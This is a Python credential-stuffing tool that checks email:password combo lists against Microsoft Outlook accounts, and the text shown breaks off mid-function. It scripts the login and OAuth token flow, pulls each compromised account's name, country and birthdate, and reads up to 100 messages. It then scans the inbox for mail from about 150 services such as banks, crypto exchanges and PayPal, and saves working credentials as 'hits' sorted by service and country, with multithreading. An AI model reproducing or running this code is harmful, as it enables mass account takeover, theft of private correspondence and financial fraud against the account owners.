# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x
# @ryuxx_x


import requests
import json
import uuid
import re
import time
import os
import sys
from datetime import datetime
from urllib.parse import quote
from pathlib import Path
from threading import Lock

# --- Windows ANSI (VT) enable (so colors work in CMD/PowerShell) ---
def enable_windows_ansi():
    if os.name != 'nt':
        return
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE = -11
        mode = ctypes.c_uint()
        if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
            new_mode = mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING
            kernel32.SetConsoleMode(handle, new_mode)
    except Exception:
        # If enabling fails, silently continue — colors may still work on newer terminals
        pass

enable_windows_ansi()

# --- Utility: clear screen cross-platform ---
def clear_screen():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except Exception:
        pass

# --- Colors (ANSI) ---
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# --- Core classes (unchanged logic, only small IO/path tweaks elsewhere) ---
class OutlookChecker:
    def __init__(self, debug=False, custom_services=None):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        
        # Inbox services - default
        self.default_services = {
            'security@facebookmail.com': 'Facebook',
            'noreply@mail.instagram.com': 'Instagram',
            'register@account.tiktok.com': 'TikTok',
            'info@x.com': 'Twitter',
            'noreply@youtube.com': 'YouTube',
            'noreply@discordapp.com': 'Discord',
            'noreply@spotify.com': 'Spotify',
            'noreply@netflix.com': 'Netflix',
            'noreply@playstation.com': 'PlayStation',
            'noreply@xbox.com': 'Xbox',
            'noreply@steampowered.com': 'Steam',
            'noreply@epicgames.com': 'Epic Games',
            'noreply@riotgames.com': 'Riot Games',
            'noreply@ubisoft.com': 'Ubisoft',
            'noreply@ea.com': 'EA',
            'noreply@blizzard.com': 'Blizzard',
            'noreply@rockstargames.com': 'Rockstar',
            'noreply@nintendo.com': 'Nintendo',
            'noreply@roblox.com': 'Roblox',
            'noreply@minecraft.net': 'Minecraft',
            'noreply@paypal.com': 'PayPal',
            'noreply@binance.com': 'Binance',
            'noreply@revolut.com': 'Revolut',
            'noreply@wise.com': 'Wise',
            'noreply@venmo.com': 'Venmo',
            'noreply@cashapp.com': 'Cash App',
            'noreply@gcash.com': 'GCash',
            'noreply@paymaya.com': 'PayMaya',
            'noreply@amazon.com': 'Amazon',
            'noreply@ebay.com': 'eBay',
            'noreply@aliexpress.com': 'AliExpress',
            'noreply@shopee.com': 'Shopee',
            'noreply@lazada.com': 'Lazada',
            'noreply@temu.com': 'Temu',
            'noreply@shein.com': 'Shein',
            'noreply@foodpanda.com': 'Foodpanda',
            'noreply@grab.com': 'Grab',
            'noreply@ubereats.com': 'Uber Eats',
            'noreply@doordash.com': 'DoorDash',
            'noreply@walmart.com': 'Walmart',
            'noreply@bestbuy.com': 'Best Buy',
            'noreply@target.com': 'Target',
            'noreply@hulu.com': 'Hulu',
            'noreply@disneyplus.com': 'Disney+',
            'noreply@viu.com': 'Viu',
            'noreply@iqiyi.com': 'iQIYI',
            'noreply@wetv.vip': 'WeTV',
            'noreply@plutotv.com': 'Pluto TV',
            'noreply@tubitv.com': 'Tubi TV',
            'noreply@peacocktv.com': 'Peacock',
            'noreply@crunchyroll.com': 'Crunchyroll',
            'noreply@funimation.com': 'Funimation',
            'noreply@anilist.co': 'AniList',
            'noreply@myanimelist.net': 'MyAnimeList',
            'noreply@9anime.to': '9anime',
            'noreply@riotgames.com': 'Valorant',
            'noreply@epicgames.com': 'Fortnite',
            'noreply@ea.com': 'EA Sports',
            'noreply@ubisoft.com': 'Rainbow Six Siege',
            'noreply@blizzard.com': 'Overwatch',
            'noreply@battlenet.com': 'Battle.net',
            'noreply@playstation.com': 'PlayStation Network',
            'noreply@xbox.com': 'Xbox Live',
            'noreply@steam.com': 'Steam',
            'noreply@epicgames.com': 'Epic Games Launcher',
            'noreply@apple.com': 'Apple',
            'noreply@icloud.com': 'iCloud',
            'noreply@outlook.com': 'Outlook',
            'noreply@gmail.com': 'Gmail',
            'noreply@yahoo.com': 'Yahoo',
            'noreply@zoho.com': 'Zoho',
            'noreply@protonmail.com': 'ProtonMail',
            'noreply@yandex.ru': 'Yandex',
            'noreply@gmx.com': 'GMX',
            'noreply@office.com': 'Microsoft Office',
            'noreply@onedrive.com': 'OneDrive',
            'noreply@dropbox.com': 'Dropbox',
            'noreply@adobe.com': 'Adobe',
            'noreply@canva.com': 'Canva',
            'noreply@figma.com': 'Figma',
            'noreply@notion.com': 'Notion',
            'noreply@trello.com': 'Trello',
            'noreply@asana.com': 'Asana',
            'noreply@monday.com': 'Monday.com',
            'noreply@jira.com': 'Jira',
            'noreply@github.com': 'GitHub',
            'noreply@gitlab.com': 'GitLab',
            'noreply@bitbucket.com': 'Bitbucket',
            'noreply@replit.com': 'Replit',
            'noreply@glitch.com': 'Glitch',
            'noreply@codepen.io': 'CodePen',
            'noreply@stackblitz.com': 'StackBlitz',
            'noreply@digitalocean.com': 'DigitalOcean',
            'noreply@vercel.com': 'Vercel',
            'noreply@railway.app': 'Railway',
            'noreply@render.com': 'Render',
            'noreply@cloudflare.com': 'Cloudflare',
            'noreply@aws.amazon.com': 'AWS',
            'noreply@azure.microsoft.com': 'Azure',
            'noreply@googlecloud.com': 'Google Cloud',
            'noreply@paypal.com': 'PayPal',
            'noreply@revolut.com': 'Revolut',
            'noreply@wise.com': 'Wise',
            'noreply@venmo.com': 'Venmo',
            'noreply@cashapp.com': 'Cash App',
            'noreply@gcash.com': 'GCash',
            'noreply@paymaya.com': 'PayMaya',
            'noreply@unionbankph.com': 'UnionBank',
            'noreply@bpi.com.ph': 'BPI',
            'noreply@bdo.com.ph': 'BDO',
            'noreply@metrobank.com.ph': 'Metrobank',
            'noreply@landbank.com': 'LandBank',
            'noreply@securitybank.com': 'Security Bank',
            'noreply@revolut.com': 'Revolut',
            'noreply@wise.com': 'Wise',
            'noreply@coinbase.com': 'Coinbase',
            'noreply@kraken.com': 'Kraken',
            'noreply@binance.com': 'Binance',
            'noreply@robinhood.com': 'Robinhood',
            'noreply@etoro.com': 'eToro',
            'noreply@airbnb.com': 'Airbnb',
            'noreply@booking.com': 'Booking.com',
            'noreply@expedia.com': 'Expedia',
            'noreply@hotels.com': 'Hotels.com',
            'noreply@tripadvisor.com': 'TripAdvisor',
            'noreply@marriott.com': 'Marriott',
            'noreply@hilton.com': 'Hilton',
            'noreply@hyatt.com': 'Hyatt',
            'noreply@cebuair.com': 'Cebu Pacific',
            'noreply@philippineairlines.com': 'Philippine Airlines',
            'noreply@airasia.com': 'AirAsia',
            'noreply@delta.com': 'Delta Airlines',
            'noreply@emirates.com': 'Emirates',
            'noreply@qatarairways.com': 'Qatar Airways',
            'noreply@singaporeair.com': 'Singapore Airlines',
            'noreply@ana.co.jp': 'ANA',
            'noreply@united.com': 'United Airlines',
            'noreply@etihad.com': 'Etihad Airways',
            'noreply@nike.com': 'Nike',
            'noreply@adidas.com': 'Adidas',
            'noreply@fitbit.com': 'Fitbit',
            'noreply@myfitnesspal.com': 'MyFitnessPal',
            'noreply@strava.com': 'Strava',
            'noreply@garmin.com': 'Garmin',
            'noreply@headspace.com': 'Headspace',
            'noreply@calm.com': 'Calm',
            'noreply@flo.health': 'Flo',
            'noreply@peloton.com': 'Peloton'
        }
        
        # Özel servisler varsa kullan, yoksa varsayılanı kullan
        self.services = custom_services if custom_services else self.default_services
        
    def log(self, message):
        if self.debug:
            print(f"[DEBUG] {message}")
    
    def parse_country_from_json(self, json_data):
        """Extract country information from JSON"""
        try:
            if isinstance(json_data, dict):
                if "accounts" in json_data and isinstance(json_data["accounts"], list):
                    for account in json_data["accounts"]:
                        if isinstance(account, dict) and "location" in account and account["location"]:
                            country = str(account["location"]).strip()
                            self.log(f"Location bulundu (accounts): {country}")
                            return country
                
                if "location" in json_data and json_data["location"]:
                    location = json_data["location"]
                    self.log(f"Location bulundu (direkt): {location}")
                    
                    if isinstance(location, str):
                        parts = [p.strip() for p in location.split(',')]
                        if parts:
                            return parts[-1]
                    
                    elif isinstance(location, dict):
                        for key in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                            if key in location and location[key]:
                                return str(location[key])
                
                for key in ['country', 'countryOrRegion', 'countryCode', 'Country', 'homeLocation']:
                    if key in json_data and json_data[key]:
                        val = json_data[key]
                        if isinstance(val, str):
                            return val
                        elif isinstance(val, dict) and 'country' in val:
                            return str(val['country'])
                
        except Exception as e:
            self.log(f"Country parsing error: {str(e)}")
        
        return ""
    
    def parse_name_from_json(self, json_data):
        """Extract name information from JSON"""
        try:
            if isinstance(json_data, dict):
                if "displayName" in json_data and json_data["displayName"]:
                    return str(json_data["displayName"])
                
                for key in ['name', 'givenName', 'fullName', 'DisplayName']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except Exception as e:
            self.log(f"Name parsing error: {str(e)}")
        
        return ""
        
    def check(self, email, password):
        try:
            self.log(f"The inspection is starting: {email}")
            
            # Step 1: IDP kontrolü
            self.log("Step 1: IDP control...")
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = self.session.get(url1, headers=headers1, timeout=15)
            self.log(f"IDP Response: {r1.status_code}")
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                self.log("❌ IDP control failed")
                return {"status": "BAD", "services": {}, "country": "", "name": "", "birthdate": ""}
            
            if "MSAccount" not in r1.text:
                self.log("❌ MSAccount not found")
                return {"status": "BAD", "services": {}, "country": "", "name": "", "birthdate": ""}
            
            self.log("✅ IDP control successful")
            
            # Step 2: OAuth authorize
            self.log("Step 2: OAuth authorize...")
            time.sleep(0.5)
            
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                self.log("❌ PPFT or URL not found")
                return {"status": "BAD", "services": {}, "country": "", "name": "", "birthdate": ""}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 3: Login POST
            self.log("Step 3: Login POST...")
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            self.log(f"Login Response: {r3.status_code}")
            
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                self.log("❌ Incorrect password")
                return {"status": "BAD", "services": {}, "country": "", "name": "", "birthdate": ""}
            
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "BAD", "services": {}, "country": "", "name": "", "birthdate": ""}
            
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BAD", "services": {}, "country": "", "name": "", "birthdate": ""}
            
            location = r3.headers.get("Location", "")
            if not location:
                self.log("❌ Redirect location not found")
                return {"status": "BAD", "services": {}, "country": "", "name": "", "birthdate": ""}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                self.log("❌ Auth code not found")
                return {"status": "BAD", "services": {}, "country": "", "name": "", "birthdate": ""}
            
            code = code_match.group(1)
            self.log(f"✅ Auth code alındı: {code[:30]}...")
            
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                self.log("❌ No CID found")
                return {"status": "BAD", "services": {}, "country": "", "name": "", "birthdate": ""}
            
            cid = mspcid.upper()
            self.log(f"CID: {cid}")
            
            # Step 4: Token 
            self.log("Step 4: Receiving Token...")
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            
            if "access_token" not in r4.text:
                self.log(f"❌ Access token could not be obtained")
                return {"status": "BAD", "services": {}, "country": "", "name": "", "birthdate": ""}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            self.log(f"✅ Token received")
            
            # Step 5: Profil bilgileri
            self.log("Step 5: Profile information is being retrieved...")
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}"
            }
            
            country = ""
            name = ""
            birthdate = ""
            
            try:
                r5 = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                                      headers=profile_headers, timeout=15)
                
                if r5.status_code == 200:
                    profile = r5.json()
                    self.log(f"V1Profile Response: {json.dumps(profile, indent=2)}")
                    
                    country = self.parse_country_from_json(profile)
                    name = self.parse_name_from_json(profile)
                    
                    birth_day = profile.get("birthDay", "")
                    birth_month = profile.get("birthMonth", "")
                    birth_year = profile.get("birthYear", "")
                    birthdate = f"{birth_day}-{birth_month}-{birth_year}" if birth_day else ""
                    
                    self.log(f"✅ Profil V1: Name={name} | Country={country}")
            except Exception as e:
                self.log(f"V1Profile error: {str(e)}")
            
            if not country:
                try:
                    self.log("Step 5b: Testing the Graph API...")
                    r5b = self.session.get("https://graph.microsoft.com/v1.0/me", headers=profile_headers, timeout=15)
                    
                    if r5b.status_code == 200:
                        graph_data = r5b.json()
                        self.log(f"Graph API Response: {json.dumps(graph_data, indent=2)}")
                        
                        if not country:
                            country = self.parse_country_from_json(graph_data)
                        if not name:
                            name = self.parse_name_from_json(graph_data)
                        
                        self.log(f"✅ Graph API: Name={name} | Country={country}")
                except Exception as e:
                    self.log(f"Graph API error: {str(e)}")
            
            if not country:
                try:
                    self.log("Step 5c: Outlook Settings deneniyor...")
                    r5c = self.session.get("https://outlook.live.com/owa/service.svc?action=GetUserSettings", headers=profile_headers, timeout=15)
        
                    if r5c.status_code == 200:
                        settings_data = r5c.json()
                        self.log(f"Settings Response: {json.dumps(settings_data, indent=2)}")
                        
                        if not country:
                            country = self.parse_country_from_json(settings_data)
                        
                        self.log(f"✅ Settings: Country={country}")
                except Exception as e:
                    self.log(f"Settings API error: {str(e)}")
            
            # Step 6: Inbox
            self.log("Step 6: Inbox receiving...")
            startup_headers = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": str(uuid.uuid4()),
                "x-req-source": "Mini",
                "authorization": f"Bearer {access_token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
                "action": "StartupData",
                "x-owa-correlationid": str(uuid.uuid4()),
                "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*",
                "origin": "https://outlook.live.com",
                "x-requested-with": "com.microsoft.outlooklite",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://outlook.live.com/",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9"
            }
            
            inbox_text = ""
            
            try:
                r6 = self.session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers=startup_headers, timeout=30)
                
                self.log(f"Startup Response: {r6.status_code} - Length: {len(r6.text)}")
                inbox_text = r6.text.lower()
                
            except Exception as e:
                self.log(f"Startup error: {str(e)}")
            
            # Step 7: Messages API
            self.log("Step 7: Messages API check..")
            try:
                messages_headers = {
                    "User-Agent": "Outlook-Android/2.0",
                    "Authorization": f"Bearer {access_token}",
                    "X-AnchorMailbox": f"CID:{cid}",
                    "Accept": "application/json"
                }
                
                r7 = self.session.get(
                    f"https://outlook.office365.com/api/v2.0/me/messages?$top=100&$select=From,Subject,Body",
                    headers=messages_headers,
                    timeout=30
                )
                
                if r7.status_code == 200:
                    messages_data = r7.json()
                    messages_text = json.dumps(messages_data).lower()
                    inbox_text += " " + messages_text
                    self.log(f"✅ Messages API successful - {len(messages_text)} emails found")
                else:
                    self.log(f"⚠️ Messages API failed: {r7.status_code}")
                    
            except Exception as e:
                self.log(f"Messages API error: {str(e)}")
            
            # Step 8: Check the services
            self.log("Step 8: Service check...")
            found_services = {}
            
            for service_email, service_name in self.services.items():
                service_email_lower = service_email.lower()
                
                patterns = [
                    service_email_lower,
                    service_email_lower.replace('@', ' '),
                    service_email_lower.replace('.', ' '),
                    service_name.lower()
                ]
                
                found = False
                for pattern in patterns:
                    if pattern in inbox_text:
                        found = True
                        break
                
                found_services[service_name] = found
                
                if found:
                    self.log(f"✅ {service_name} found")
            
            if not any(found_services.values()):
                self.log("❌ No service found")
                return {"status": "BAD", "services": found_services, "country": country, "name": name, "birthdate": birthdate}
            
            found_count = sum(found_services.values())
            self.log(f"✅ Success - {found_count} services found")
            
            return {
                "status": "HIT",
                "services": found_services,
                "country": country,
                "name": name,
                "birthdate": birthdate
            }
            
        except requests.exceptions.Timeout:
            self.log("❌ Timeout")
            return {"status": "TIMEOUT", "services": {}, "country": "", "name": "", "birthdate": ""}
        except Exception as e:
            self.log(f"❌ Exception: {str(e)}")
            import traceback
            self.log(traceback.format_exc())
            return {"status": "ERROR", "services": {}, "country": "", "name": "", "birthdate": "", "error": str(e)}

class ResultManager:
    def __init__(self, combo_filename, mode_name):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Ensure results are created inside the script folder (cross-platform)
        base_dir = os.path.abspath(os.getcwd())
        safe_combo = "".join(c for c in combo_filename if c.isalnum() or c in (' ', '_', '-')).rstrip()
        safe_mode = "".join(c for c in mode_name if c.isalnum() or c in (' ', '_', '-')).rstrip()
        self.base_folder = os.path.join(base_dir, "result", f"({timestamp})_{safe_combo}_{safe_mode}_hits")
        self.services_folder = os.path.join(self.base_folder, "services")
        self.countries_folder = os.path.join(self.base_folder, "countries")
        
        Path(self.services_folder).mkdir(parents=True, exist_ok=True)
        Path(self.countries_folder).mkdir(parents=True, exist_ok=True)
        
    def save_hit(self, email, password, result_data):
        services = result_data.get("services", {})
        country = result_data.get("country", "").strip().upper()
        name = result_data.get("name", "")
        birthdate = result_data.get("birthdate", "")
        
        result_line = f"{email}:{password}"
        if name:
            result_line += f" | {name}"
        if country:
            result_line += f" | {country}"
        if birthdate and birthdate != "--":
            result_line += f" | {birthdate}"
        
        service_list = [svc for svc, found in services.items() if found]
        if service_list:
            result_line += f" | {', '.join(service_list)}"
        
        result_line += "\n"
        
        for service_name, found in services.items():
            if found:
                service_file = os.path.join(self.services_folder, f"{service_name}_hits.txt")
                with open(service_file, 'a', encoding='utf-8') as f:
                    f.write(result_line)
        
        if country and len(country) >= 2:
            country_code = country[:2].lower()
            country_file = os.path.join(self.countries_folder, f"{country_code}.txt")
            
            try:
                with open(country_file, 'a', encoding='utf-8') as f:
                    f.write(result_line)
            except Exception as e:
                print(f"[ERROR] Country registration error: {e}")

class LiveStats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.bads = 0
        self.errors = 0
        self.start_time = time.time()
        self.lock = Lock()
        
    def update(self, status):
        with self.lock:
            self.checked += 1
            if status == "HIT":
                self.hits += 1
            elif status in ["BAD", "TIMEOUT"]:
                self.bads += 1
            else:
                self.errors += 1
    
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
            
            return {
                "total": self.total,
                "checked": self.checked,
                "hits": self.hits,
                "bads": self.bads,
                "errors": self.errors,
                "progress": progress,
                "cpm": cpm,
                "elapsed": elapsed
            }
    
    def print_stats(self, colors):
        stats = self.get_stats()
        elapsed_str = time.strftime("%H:%M:%S", time.gmtime(stats['elapsed']))
        
        print(f"\r{colors.CYAN}[{stats['checked']}/{stats['total']}]{colors.END} " +
              f"{colors.GREEN}✅ {stats['hits']}{colors.END} | " +
              f"{colors.RED}❌ {stats['bads']}{colors.END} | " +
              f"{colors.YELLOW}⚠️ {stats['errors']}{colors.END} | " +
              f"{colors.MAGENTA}{stats['progress']:.1f}%{colors.END} | " +
              f"{colors.BLUE}{stats['cpm']:.0f} CPM{colors.END} | " +
              f"{colors.WHITE}{elapsed_str}{colors.END}", end='', flush=True)

# --- Main UI (PC-friendly, original look preserved) ---
def main():
    clear_screen()
    banner = f"""{Colors.CYAN}{Colors.BOLD}
    ___       ___       ___       ___       ___       ___       ___   
   /\__\     /\  \     /\  \     /\__\     /\  \     /\  \     /\__\  
  /:/__/_   /::\  \    \:\  \   /::L_L_   /::\  \   _\:\  \   /:/  /  
 /::\/\__\ /:/\:\__\   /::\__\ /:/L:\__\ /::\:\__\ /\/::\__\ /:/__/   
 \/\::/  / \:\/:/  /  /:/\/__/ \/_/:/  / \/\::/  / \::/\/__/ \:\  \   
   /:/  /   \::/  /   \/__/      /:/  /    /:/  /   \:\__\    \:\__\  
   \/__/     \/__/               \/__/     \/__/     \/__/     \/__/  
    ___       ___       ___       ___       ___       ___       ___   
   /\  \     /\__\     /\  \     /\  \     /\__\     /\  \     /\  \  
  /::\  \   /:/__/_   /::\  \   /::\  \   /:/ _/_   /::\  \   /::\  \ 
 /:/\:\__\ /::\/\__\ /::\:\__\ /:/\:\__\ /::-"\__\ /::\:\__\ /::\:\__\\
 \:\ \/__/ \/\::/  / \:\:\/  / \:\ \/__/ \;:;-",-" \:\:\/  / \;:::/  /
  \:\__\     /:/  /   \:\/  /   \:\__\    |:|  |    \:\/  /   |:\/__/ 
   \/__/     \/__/     \/__/     \/__/     \|__|     \/__/     \|__|
   By: @ryuxx_x{Colors.END}
    """
    print(banner)
    
    menu = f"""
{Colors.BOLD}{Colors.BLUE}┌─────────────────────────────────────────┐
│           {Colors.GREEN}MENU OPTIONS{Colors.BLUE}                  │
├─────────────────────────────────────────┤
│  {Colors.YELLOW}[1]{Colors.WHITE} Single Control    {Colors.CYAN}(Test)     {Colors.BLUE}      │
│  {Colors.YELLOW}[2]{Colors.WHITE} Serial Scan     {Colors.CYAN}(Safe)  {Colors.BLUE}           │
│  {Colors.YELLOW}[3]{Colors.WHITE} 10 Thread         {Colors.CYAN}(Middle)     {Colors.BLUE}    │
│  {Colors.YELLOW}[4]{Colors.WHITE} 25 Thread        {Colors.CYAN}(Fast)    {Colors.BLUE}        │
└─────────────────────────────────────────┘

{Colors.MAGENTA}┌─────────────────────────────────────────┐
│         {Colors.YELLOW}INBOX MOD OPTIONS{Colors.MAGENTA}               │
├─────────────────────────────────────────┤
│  {Colors.GREEN}[A]{Colors.WHITE} Full Capture     {Colors.CYAN}(26 Services){Colors.MAGENTA}     │
│  {Colors.GREEN}[B]{Colors.WHITE} Manual Inbox     {Colors.CYAN}(Private)     {Colors.MAGENTA}    │
└─────────────────────────────────────────┘{Colors.END}
    """
    print(menu)
    
    # Ensure valid choice
    while True:
        choice = input(f"{Colors.GREEN}Thread Selection {Colors.YELLOW}[1-4]{Colors.GREEN}: {Colors.END}").strip()
        if choice in ["1", "2", "3", "4"]:
            break
        else:
            print(f"{Colors.RED}❌ Invalid selection! Please enter a number between 1-4.{Colors.END}")
    
    while True:
        inbox_mode = input(f"{Colors.GREEN}Inbox Mod {Colors.YELLOW}[A/B]{Colors_GREEN if False else Colors.GREEN}: {Colors.END}").strip().upper()
        if inbox_mode in ["A", "B"]:
            break
        else:
            print(f"{Colors.RED}❌ Invalid mode! Please enter A or B.{Colors.END}")
    
    # Inbox mod belirleme
    custom_services = None
    mode_name = "full_capture"
    
    if inbox_mode == "B":
        print(f"\n{Colors.CYAN}{'─'*64}{Colors.END}")
        print(f"{Colors.YELLOW}Manual Inbox Entry{Colors.END}")
        print(f"{Colors.WHITE}Format: email@domain.com:ServiceName{Colors.END}")
        print(f"{Colors.WHITE}Example: noreply@steam.com:Steam{Colors.END}")
        print(f"{Colors.WHITE}Leave a blank line to finish.{Colors.END}")
        print(f"{Colors.CYAN}{'─'*64}{Colors.END}\n")
        
        custom_services = {}
        while True:
            inbox_input = input(f"{Colors.GREEN}Inbox #{len(custom_services)+1}: {Colors.END}").strip()
            if not inbox_input:
                break
            
            if ':' in inbox_input:
                email, name = inbox_input.split(':', 1)
                custom_services[email.strip()] = name.strip()
            else:
                print(f"{Colors.RED}❌ Incorrect format! Should be email:Service{Colors.END}")
        
        if not custom_services:
            print(f"{Colors.RED}❌ You must enter at least one inbox!{Colors.END}")
            sys.exit(1)
        
        mode_name = "manual_inbox"
        print(f"\n{Colors.GREEN}✅ {len(custom_services)}inbox added!{Colors.END}")
    
    debug_input = input(f"{Colors.YELLOW}Debug {Colors.WHITE}[y/n]{Colors.YELLOW}: {Colors.END}").strip().lower()
    debug_mode = debug_input == 'y'
    
    checker = OutlookChecker(debug=debug_mode, custom_services=custom_services)
    
    if choice == "1":
        print(f"\n{Colors.CYAN}{'─'*64}{Colors.END}")
        email = input(f"{Colors.GREEN}Email: {Colors.END}").strip()
        password = input(f"{Colors.GREEN}Pass: {Colors.END}").strip()
        
        print(f"\n{Colors.YELLOW}📄 Checking...{Colors.END}\n")
        result = checker.check(email, password)
        
        if result["status"] == "HIT":
            services_found = [svc for svc, found in result["services"].items() if found]
            print(f"{Colors.GREEN}✅ HIT{Colors.END}")
            print(f"{Colors.WHITE}Email: {email}{Colors.END}")
            print(f"{Colors.CYAN}Services ({len(services_found)}): {', '.join(services_found)}{Colors.END}")
            if result["country"]:
                print(f"{Colors.MAGENTA}Country: {result['country']}{Colors.END}")
            if result["name"]:
                print(f"{Colors.MAGENTA}Name: {result['name']}{Colors.END}")
        else:
            print(f"{Colors.RED}❌ {result['status']}: {email}{Colors.END}")
            
        print(f"{Colors.CYAN}{'─'*64}{Colors.END}")
        
    else:
        # Seri / Multi işlem: dosya okuma - PC-friendly
        print()
        file_path = input(f"{Colors.GREEN}Combo file (enter path or leave blank and select file): {Colors.END}").strip()
        
        if not file_path:
            # Try GUI file dialog (optional, more user-friendly on desktop)
            try:
                import tkinter as tk
                from tkinter import filedialog
                root = tk.Tk()
                root.withdraw()
                selected = filedialog.askopenfilename(title="Select combo file", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
                root.destroy()
                if selected:
                    file_path = selected
                else:
                    print(f"{Colors.RED}❌ No file selected. Exiting..{Colors.END}")
                    sys.exit(1)
            except Exception:
                print(f"{Colors.YELLOW}(!) The GUI file selection is unavailable; please enter the full file path.{Colors.END}")
                file_path = input(f"{Colors.GREEN}Combo file (full path): {Colors.END}").strip()
        
        try:
            # Read file lines (PC-safe)
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
            
            if not lines:
